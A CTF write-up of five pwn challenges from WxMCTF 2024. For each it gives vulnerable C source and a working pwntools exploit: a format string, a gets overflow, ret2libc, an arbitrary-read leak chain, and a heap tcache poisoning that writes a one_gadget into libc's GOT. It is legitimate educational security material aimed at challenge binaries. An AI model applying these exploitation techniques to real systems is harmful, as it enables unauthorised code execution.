# WxMCTF 2024

{{< image src="https://i.postimg.cc/Fsf8TQKG/scoreboard.png" caption="WxMCTF 2024 Scoreboard">}}

I participated in WxMCTF 2024 as part of the Megaricano team. And our team took second place. The Megaricano team is made up of Raon Secure Core Research Team members.

# Pwn
## Moodle Madness
{{< admonition info "Challenge Description" false >}}
It recently came to light from an anonymous source that "Moodle," the math assignment program made famous by Ms. Gugoiu, has an exploit to see the answers to questions. Buddhathe18th, always reluctant to do homework, decided to investigate this exploit himself for the notorious 3.2 STACK Part 2 Challenge. He vaguely recalls that it involves inputting a string into the answer box, but with 1 hour left, he needs some help. Could you help him find the exploit?
{{< /admonition >}}

### Analysis
There is no server information. Just one binary. At first, I read the problem description and thought it was supposed to provide an exploit method related to the binary. But this was a bad idea and I wasted some time because of it.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 buf[126]; // [rsp+40h] [rbp-3F0h] BYREF

  buf[125] = __readfsqword(0x28u);
  puts(
    "The graph of the polynomial function f(x) = -2x^4-16x^3-49x^2-68x-33 is symmetric with respect to a vertical line. F"
    "ind the equation of this vertical line:\n"
    "x= ");
  memset(buf, 0, 1000);
  read(0, buf, 0x3E8uLL);
  printf((const char *)buf);     // Format String Bug
  if ( !strcmp((const char *)buf, "3\n") )
    printf("\nCorrect!");
  else
    printf("\nIncorrect!");
  return 0;
}
```
### Solve
If you open the binary with IDA, you can immediately find a format string bug, which made me confused.
But this challenge is baby baby baby challenge, so if you open the binary through gdb and run it for a bit, you can see the flags stored upside down in the stack by 4 bytes.

```
pwndbg> stack 50
00:0000│ rsp 0x7fffffffdeb0 ◂— 'cmxw    m{ft    ld00    4m_3    r3t5    dn1m    }!!!    '
01:0008│-428 0x7fffffffdeb8 ◂— 'm{ft    ld00    4m_3    r3t5    dn1m    }!!!    '
02:0010│-420 0x7fffffffdec0 ◂— 'ld00    4m_3    r3t5    dn1m    }!!!    '
03:0018│-418 0x7fffffffdec8 ◂— '4m_3    r3t5    dn1m    }!!!    '
04:0020│-410 0x7fffffffded0 ◂— 'r3t5    dn1m    }!!!    '
05:0028│-408 0x7fffffffded8 ◂— 'dn1m    }!!!    '
06:0030│-400 0x7fffffffdee0 ◂— '}!!!    '
```
{{< admonition note "flag" true >}}
`wxmctf{m00dl3_m45t3rm1nd!!!}`
{{< /admonition >}}

## TEJ3M
{{< admonition info "Description" false >}}
Here's my TEJ3M assignment! We're learning how to use C, and I think it's pretty easy! My teacher tells us gets is unsafe, but I think he doesn't know how to error trap!
{{< /admonition >}}
### Analysis
This challenge give source code, so easy to analysis.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void win(){
    system("cat flag.txt");
}

void func(){
    char buf[040];
    while(1) {
        puts("Enter your info: \n");
        gets(buf);
        if(strlen(buf) < 31) {
            puts("Thank you for valid data!!!\n");
            break;
        }
        puts("My teacher says that's unsafe!\n");
    }
}

void main() {
    setvbuf(stdin, NULL, 2, 0);
    setvbuf(stdout, NULL, 2, 0);
    func();
}
```
```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```
As you can see, it is a 32-bit binary with no stack canary or PIE, and a stack overflow occurs through the `gets` function. And thankfully the `win` function exists. EZPZ
### Exploit
```python
from pwn import *

#p = process("./assgn1_2o3BvZ6")
p = remote("f61841b.678470.xyz", 30717)
e = ELF("./assgn1_2o3BvZ6")


p.sendline(b"a" * 44 + p32(e.sym.win))

p.interactive()
```
{{< admonition note "flag" true >}}
`wxmctf{1_th1nk_1_f41led...}`
{{< /admonition >}}

## Nah id win
{{< admonition info "Description" false >}}
As the strongest problem in history faced off against the strongest pwner of today, they asked it: "Are you the shell because you are /bin/sh? Or are you /bin/sh because you are the shell?"

The pwner laughed. "Stand proud. You are strong." said the pwner. At this moment, the pwner used their domain expansion.

"DOMAIN EXPANSION. ret2libc."

The problem began using reverse pwn technique, but it wasn't enough. The domain was simply too strong. However, the problem had not yet used its domain expansion.

"DOMAIN EXPANSION: Return restrictions." The problem said, and the domain was instantly shattered.

"Nah, I'd win." The problem said, and the pwner was dealt with.
{{< /admonition >}}
### Analysis
If you read the description, you can see that the author is a fan of Jujutsu Kaisen. lol

`“DOMAIN EXPANSION. ret2libc.”`

This challenge give source code, binary and libc. 
```c
#include <stdio.h>
#include <stdlib.h>

int vuln() {
    char buf[0x20];
    printf("My cursed technique is revealing libc... %p\n",printf);
    gets(buf);
    if(__builtin_return_address(0) < 0x90000000) {
        return 0;
    }
    printf("NAH I'D WIN!\n");
    exit(0);
}
int main() {
    setvbuf(stdin, NULL, 2, 0);
    setvbuf(stdout, NULL, 2, 0);
    vuln();
    return 0;
}
```
```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```
This is another vulnerable 32-bit binary. There is no `win` function, but you can see from the description that you can use the ret2libc technique. In `vuln` function, we can get libc leak. So, just do ret2libc.

### Exploit
```python
from pwn import *

#p = process("./vuln", env={"LD_PRELOAD":"./libc.so.6"})
p = remote("7d9d14b.678470.xyz", 31709)
e = ELF("./vuln")
libc = ELF("./libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']

p.recvuntil(b"My cursed technique is revealing libc... ")
libc_leak = int(p.recvline().strip(), 16) - 0x57a90
log.info("libc base: " + hex(libc_leak))
system = libc_leak + libc.sym.system
binsh = libc_leak + next(libc.search(b"/bin/sh"))
#gdb.attach(p)
p.sendline(b"a" * 44 + p32(0x0804900e) + p32(system) + p32(binsh) + p32(binsh))

p.interactive()
```
{{< admonition note "flag" true >}}
`wxmctf{d0main_expansion:ret2libc.}`
{{< /admonition >}}

## leakleakleak
{{< admonition info "Description" false >}}
Leak, leak, leak, leak, I want you in my leak!
{{< /admonition >}}
### Analysis
This challenge give source code, binary and Dockerfile.
```c
// compile with: gcc leakleakleak.c -o leakleakleak -fpie -pie

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>

char flag[128] = {0};

typedef struct {
    char username[32];
    char *description;
} User;

void warmup_heap(void) {
    void *addrs[3];
    for (size_t i = 0; i < 3; ++i) {
        addrs[i] = malloc(9000);
    }

    free(addrs[1]);
}

User *create_user(void) {
    User *user = calloc(1, sizeof (User));
    user->description = calloc(1, 256);
    return user;
}

void destroy_user(User *user) {
    free(user->description);
    free(user);
}

void init(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

void read_flag(void) {
    int flag_fd = open("./flag.txt", O_RDONLY);
    off_t flag_size = lseek(flag_fd, 0, SEEK_END);
    lseek(flag_fd, 0, SEEK_SET);
    read(flag_fd, flag, flag_size);
    flag[flag_size] = '\00';
    close(flag_fd);
}

int main() {
    init();
    read_flag();
    warmup_heap();

    User *user = create_user();

    for (_Bool quit = 0; !quit; ) {
        printf("What is your name? ");
        read(STDIN_FILENO, user, sizeof(*user));
        printf("Hello %s!\n", user->username);

        puts("Let me tell you something about yourself! :3");
        printf("%s\n", user->description);

        printf("Continue? (Y/n) ");
        char c = getchar();
        if (c == 'n' || c == 'N')
            quit = 1;
    }

    puts("Boom! Boom, boom, boom! I want YOU in my room!");

    destroy_user(user);
    return 0;
}
```
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```
First 64-bit Binary with Partial RELRO!!

The vulnerability is that in `read(STDIN_FILENO, user, sizeof(*user));`, the `description` member in `User` structure, which is `char*`, can be manipulated by receiving input equal to the size of the `User` structure.

We can use AAR with `printf("%s\n", user->description);`.

### Exploit
We have AAR. So I use AAR to `leak heap -> leak libc -> leak environ -> leak flag`.
```python
from pwn import *

p = process("./leakleakleak")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'
# p = remote("32cb2f5.678470.xyz", 32411)

pay = b"a" * 33
p.sendafter(b"?", pay)
p.recvuntil(pay)
res = (u64(p.recvn(5).ljust(8, b"\x00")) << 8)
print(hex(res))
p.sendlineafter(b"?", b"Y")

pay = b"a" * 32 + p64(res+ 0x118)
p.sendafter(b"?", pay)
p.recvuntil(b":3\n")
res = u64(p.recvn(6).ljust(8, b"\x00"))
print(hex(res))

pay = b"a" * 32 + p64(res+ 0x6e80)
p.sendafter(b"?", pay)
p.recvuntil(b":3\n")
res = u64(p.recvn(6).ljust(8, b"\x00"))
print("environ" + hex(res))
p.sendlineafter(b"?", b"Y")

pay = b"a" * 32 + p64(res-0x30)
p.sendafter(b"?", pay)
p.recvuntil(b":3\n")
res = u64(p.recvn(6).ljust(8, b"\x00"))
print(hex(res))
#gdb.attach(p)
pay = b"a" * 32 + p64(res+ 0x2fab)
p.sendafter(b"?", pay)

p.interactive()
```
{{< admonition note "flag" true >}}
`wxmctf{woooOoOoO0O0O00_just_M3_4nd_Y0U_tog3th3r_in_MY_r00m_x3c}`
{{< /admonition >}}


## lain_writes_in_lisp
{{< admonition info "Description" false >}}
Have you read your SICP today?

HINT: After you get the leaks there's an almost arbitrarily long overflow on the heap in the "add_token" function. Use it to corrupt the heap's metadata.
{{< /admonition >}}
{{< image src="https://i.postimg.cc/SR67jDPv/image.png">}}

I First-Blooded this Challenge!!

### Analysis

This challenge give source code, binary and Dockerfile.
```c
#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>

#define MAX_TOKEN_SIZE 1024
#define next(token) (*(token) = (*(token))->next)

typedef struct token {
  char *str;
  struct token *next;
} Token;

typedef enum { none, number, string, function } Type;

typedef struct number {
  int64_t value;
} Number;

typedef struct string {
  char *str_ptr;
  size_t str_len;
} String;

typedef struct function {
  char *function_name;
} Function;

typedef struct node {
  Type type;
  struct node *child_nodes;
  struct node *next;
  union {
    Number number;
    String string;
    Function func;
  } value;
} Node;
_Bool panic = false;

void boot_os(void);
void add_token(const char *token_str, size_t token_len, Token **beg, Token **end);
void destroy_tokens(Token *token);
Token *tokenize(const char *s, size_t len);
Node *create_node(void);
void destroy_nodes(Node *node);
_Bool is_number(const char *s);
char *get_string_literal(char *s, size_t *ret_len);
char *get_function_by_name(char *s);
Node *parse_token(Token **token);
Node *parse_expr(Token **token);
Node *eval_function(Node *node);
Node *eval(Node *node);
Node *plus_fnc(Node *args);
Node *mul_fnc(Node *args);
Node *none_fnc(Node *args);
void print_node(Node *args);
int main();

void boot_os(void) {
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
}

void add_token(const char *token_str, size_t token_len, Token **beg, Token **end) {
  Token *new_token = calloc(1, sizeof (Token));
  if (new_token == NULL) {
    fprintf(stderr, "I just don't know what went wrong...\n");
    exit(-1);
  }
  new_token->next = NULL;
  new_token->str = calloc(1, strlen(token_str) + 1);
  if (new_token->str == NULL) {
    fprintf(stderr, "I just don't know what went wrong...\n");
    exit(-1);
  }
  memcpy(new_token->str, token_str, token_len);
  if (*beg == NULL) {
    *beg = new_token;
    *end = new_token;
  } else {
    (*end)->next = new_token;
    *end = new_token;
  }
}

void destroy_tokens(Token *token) {
  if (token == NULL)
    return;
  destroy_tokens(token->next);
  free(token->str);
  free(token);
}

Token *tokenize(const char *s, size_t len) {
  char token_str[MAX_TOKEN_SIZE + 1];
  size_t token_length = 0;
  Token *beg = NULL;
  Token *end = NULL;
  _Bool inside_string = false;
  for (size_t i = 0; i < len; ++i) {
    char c = s[i];
    if ((c == ' ' || c == '\n' || c == '(' || c == ')') && !inside_string) {
      if (token_length != 0) {
        token_str[token_length] = '\0';
        add_token(token_str, token_length, &beg, &end);
        token_length = 0;
      }
      if (c == '(') {
        add_token("(", 1, &beg, &end);
      } else if (c == ')') {
        add_token(")", 1, &beg, &end);
      }
    } else if (token_length <= MAX_TOKEN_SIZE) {
      token_str[token_length++] = c;
    } else {
      panic = true;
      fprintf(stderr, "Token too long! Aborting...\n");
      return beg;
    }

    if (c == '"') {
      if (inside_string) {
        token_str[token_length] = '\0';
        add_token(token_str, token_length, &beg, &end);
        token_length = 0;
      }
      inside_string = !inside_string;
    }
  }

  return beg;
}

Node *create_node(void) {
  Node *node = malloc(sizeof (Node));
  if (node == NULL) {
    fprintf(stderr, "I just don't know what went wrong...\n");
    exit(-1);
  }
  node->child_nodes = NULL;
  node->next = NULL;
  node->type = none;
  return node;
}

void destroy_nodes(Node *node) {
  if (node == NULL)
    return;
  if (node->child_nodes != NULL)
    destroy_nodes(node->child_nodes);
  if (node->next != NULL)
    destroy_nodes(node->next);
  if (node->type == string)
    free(node->value.string.str_ptr);
  free(node);
}

_Bool is_number(const char *s) {
  while (*s)
    if (!isdigit(*s++))
      return false;
  return true;
}

char *get_string_literal(char *s, size_t *ret_len) {
  if (s == NULL)
    return NULL;
  if (*s != '"')
    return NULL;
  size_t len = 1;
  while (s[len] != '"')
    ++len;
  char *new_s = calloc(1, len+1);
  memcpy(new_s, s+1, len-1);
  new_s[len] = '\0';
  *ret_len = len-1;
  return new_s;
}

char *get_function_by_name(char *s) {
  if (strcmp(s, "+") == 0) {
    return "+";
  } else if (strcmp(s, "*") == 0) {
    return "*";
  } else {
    return NULL;
  }
}

Node *parse_token(Token **token) {
  Node *node = create_node();
  char *str = NULL;
  size_t len;
  if (is_number((*token)->str)) {
    node->type = number;
    node->value.number.value = strtoll((*token)->str, NULL, 10);
  } else if ((str = get_string_literal((*token)->str, &len))) {
    node->type = string;
    node->value.string.str_ptr = str;
    node->value.string.str_len = strlen(str);
  } else {
    node->type = function;
    char *function_name = (*token)->str;
    node->value.func.function_name = get_function_by_name(function_name);
  }
  next(token);
  return node;
}

Node *parse_expr(Token **token) {
  if (token == NULL) {
    panic = true;
    return NULL;
  }

  Node *node = NULL;
  if (strcmp((*token)->str, "(") == 0) {
    next(token);
    node = parse_expr(token);
    if (node == NULL || node->type != function) {
      panic = true;
      return NULL;
    }
    while (strcmp((*token)->str, ")")) {
      Node *child_node = parse_expr(token);
      child_node->next = node->child_nodes;
      node->child_nodes = child_node;
    }
    next(token);
  } else if (strcmp((*token)->str, ")") == 0) {
    panic = true;
    return NULL;
  } else {
    node = parse_token(token);
  }

  return node;
}

Node *plus_fnc(Node *args) {
  Node *node = create_node();

  if (args->type == number) {
    node->type = number;
    node->value.number.value = 0;
    while (args != NULL) {
      node->value.number.value += args->value.number.value;
      args = args->next;
    }
  } else if (args->type == string) {
    node->type = string;
    size_t new_size = 1;
    for (Node *arg = args; arg != NULL; arg = arg->next)
      new_size += strlen(arg->value.string.str_ptr);
    char *new_str = calloc(1, new_size);
    if (new_str == NULL) {
      fprintf(stderr, "I just don't know what went wrong...\n");
      exit(-1);
    }
    size_t offset = 0;
    for (Node *arg = args; arg != NULL; arg = arg->next) {
      size_t arg_len = arg->value.string.str_len;
      memcpy(new_str+offset, arg->value.string.str_ptr, arg_len);
      offset += arg_len;
    }
    node->value.string.str_ptr = new_str;
    node->value.string.str_len = new_size;
  }

  return node;
}

Node *mul_fnc(Node *args) {
  Node *node = create_node();

  node->type = number;
  node->value.number.value = 1;
  while (args != NULL) {
    node->value.number.value *= args->value.number.value;
    args = args->next;
  }

  return node;
}

Node *none_fnc(Node *args) {
  Node *ret = create_node();
  ret->type = none;
  return ret;
}

Node *eval_function(Node *node) {
  Node *args = NULL;
  for (Node *child_node = node->child_nodes;
       child_node != NULL;
       child_node = child_node->next) {
    Node *evaled_node = eval(child_node);
    evaled_node->next = args;
    args = evaled_node;
  }

  char *function_name = node->value.func.function_name;
  Node *ret_node = NULL;
  if (function_name == NULL) {
    ret_node = none_fnc(args);
  } else if (strcmp(function_name, "+") == 0) {
    ret_node = plus_fnc(args);
  } else if (strcmp(function_name, "*") == 0) {
    ret_node = mul_fnc(args);
  } else {
    ret_node = none_fnc(args);
  }

  destroy_nodes(args);
  return ret_node;
}

Node *eval(Node *node) {
  Node *ret_node = NULL;
  switch (node->type) {
  case number:
    ret_node = create_node();
    ret_node->type = number;
    ret_node->value.number = node->value.number;
    break;
  case string:
    ret_node = create_node();
    ret_node->type = string;
    ret_node->value.string.str_len = node->value.string.str_len;
    char *str_cpy = malloc(node->value.string.str_len+1);
    if (str_cpy == NULL) {
      fprintf(stderr, "I just don't know what went wrong...\n");
      exit(-1);
    }
    memcpy(str_cpy, node->value.string.str_ptr, node->value.string.str_len+1);
    ret_node->value.string.str_ptr = str_cpy;
    break;
  case function:
    ret_node = eval_function(node);
    break;
  default:
    break;
  }
  return ret_node;
}

void print_node(Node *args) {
  for (Node *node = args; node != NULL; node = node->next) {
    switch (node->type) {
    case number:
      printf("%ld ", node->value.number.value);
      break;
    case string:
      printf("%s ", node->value.string.str_ptr);
      break;
    default:
      break;
    }
  }
  puts("");
}

void you_should_be_able_to_solve_this(void) {
  // :-)
  system("/bin/sh");
}

int main() {
  boot_os();
  _Bool quit = false;
  while (!quit) {
    char line[10000+1];
    size_t line_len = 0;
    Token *root_token = NULL;
    Node *ast = NULL;
    Node *final = NULL;

    printf("CoplandOS <<< ");

    line_len = read(STDIN_FILENO, line, 10000);
    line[line_len] = 0;
    if (strncmp(line, "quit", 4) == 0) {
      quit = true;
      goto cleanup;
    }

    root_token = tokenize(line, line_len);
    if (panic)
      goto cleanup;
    Token *tokens = root_token;
    ast = parse_expr(&tokens);
    if (panic)
      goto cleanup;
    final = eval(ast);
    if (panic)
      goto cleanup;
    print_node(final);

  cleanup:
    panic = false;
    destroy_nodes(final);
    destroy_nodes(ast);
    destroy_tokens(root_token);
  }

  return 0;
}
```
```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```
Binary with all mitigation... :(

Binary concept is lisp VM. lisp is a representative functional programming language. lisp use `Polish notation`, so we can interact with binary like this.
```
CoplandOS <<< (+ 1 1)
2
```
If you read the source code a bit, you will see that it is a heap challenge.
#### leak
In the case of leak-related vulnerabilities, I was able to quickly find them without almost reading the source code.

```
CoplandOS <<< (+ 0 "a")
94861776503552
```
I just add 0 and some string, binary give suspiciously large numbers.
```
>>> hex(94861776503552)
'0x5646ba7dc300'
```
Without a doubt this was a heap leak vulnerability.
The reason this is possible is because of a vulnerability in `plus_fnc`.
```c
Node *plus_fnc(Node *args) {
  Node *node = create_node();
  
  if (args->type == number) {
    node->type = number;
    node->value.number.value = 0;
    while (args != NULL) {
      node->value.number.value += args->value.number.value;
      args = args->next;
    }
  } else if (args->type == string) {
    node->type = string;
    size_t new_size = 1;
    for (Node *arg = args; arg != NULL; arg = arg->next)
      new_size += strlen(arg->value.string.str_ptr);
    char *new_str = calloc(1, new_size);
    if (new_str == NULL) {
      fprintf(stderr, "I just don't know what went wrong...\n");
      exit(-1);
    }
    size_t offset = 0;
    for (Node *arg = args; arg != NULL; arg = arg->next) {
      size_t arg_len = arg->value.string.str_len;
      memcpy(new_str+offset, arg->value.string.str_ptr, arg_len);
      offset += arg_len;
    }
    node->value.string.str_ptr = new_str;
    node->value.string.str_len = new_size;
  }
  
  return node;
}
```
`plus_fnc` only checks the type of the first arg, it treats the second string pointer as just a number.

#### Overflow
```c
void add_token(const char *token_str, size_t token_len, Token **beg, Token **end) {
  Token *new_token = calloc(1, sizeof (Token));
  if (new_token == NULL) {
    fprintf(stderr, "I just don't know what went wrong...\n");
    exit(-1);
  }
  new_token->next = NULL;
  new_token->str = calloc(1, strlen(token_str) + 1);
  if (new_token->str == NULL) {
    fprintf(stderr, "I just don't know what went wrong...\n");
    exit(-1);
  }
  memcpy(new_token->str, token_str, token_len);
}
```
The overflow vulnerability exists in the `add_token` function.

A string that can be manipulated is entered in `strlen` of `calloc(1, strlen(token_str) + 1);`. If a `NULL` character is included, a chunk smaller than the size of the string can be allocated.

We can use this Vuln to abuse heap.

### Exploit
```python
from pwn import *

#p = process("./lain")
p = remote("50790b2.678470.xyz", 31454)
e = ELF("./lain")

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

def leak(addr):
    p.sendlineafter(b"<<<", "(+ \"\" " + str(addr) + ")")

a = "a" * 0x98
p.sendlineafter(b"<<<", f"(+ 0 \"a\")")
res = int(p.recvline().strip(), 10)
print(hex(res))
p.sendlineafter(b"<<<", f"(+ \"{a}\" \"{a}\")")
p.sendlineafter(b"<<<", f"(+ \"{a}\" \"{a}\")")
p.sendlineafter(b"<<<", f"(+ \"\" \"aaaaaaaa\")")

key = res >> 12
print(key)

off = res + 0x698
leak(off)
p.recvn(1)
libc_base = u64(p.recvn(6).ljust(8, b"\x00")) - 0x21ace0
og = libc_base + 0xebd38
print(hex(og))

# gdb.attach(p)

p.sendlineafter(b"<<<", b"(+ " + p64(0) *2 + b" " + p64(0x411) *4 + p64((libc_base+0x21a000) ^ key) + b")")

b = b"a" * 0x98 + p64(og)[:6]

p.sendlineafter(b"<<<", f"(+ \"".encode() + b + f"\" \"".encode() + b + f"\" \"{a}\" \"{a}\" \"{a}\" \"{a}\" \"{a}\")".encode())

p.interactive()
```
To exploit the binary, I leaked the heap address and then leaked the address of libc remaining in the heap.

After that, I was able to exploit the binary by using the overflow vulnerability to manipulate the tcache of size `0xa0` and overwrite libc got with one_gadget.
{{< admonition note "flag" true >}}
`wxmctf{(did (you (know (?))))(lisp (is (the (most (powerful (language))))))!!}`
{{< /admonition >}}

{{< admonition info "author writup" true >}}
[link](https://poniponiponiponiponiponiponiponiponi.github.io/ctf/pwn/c/2024/03/31/Challenges-I-Wrote-For-WXM-CTF-2024.html)
{{< /admonition >}}
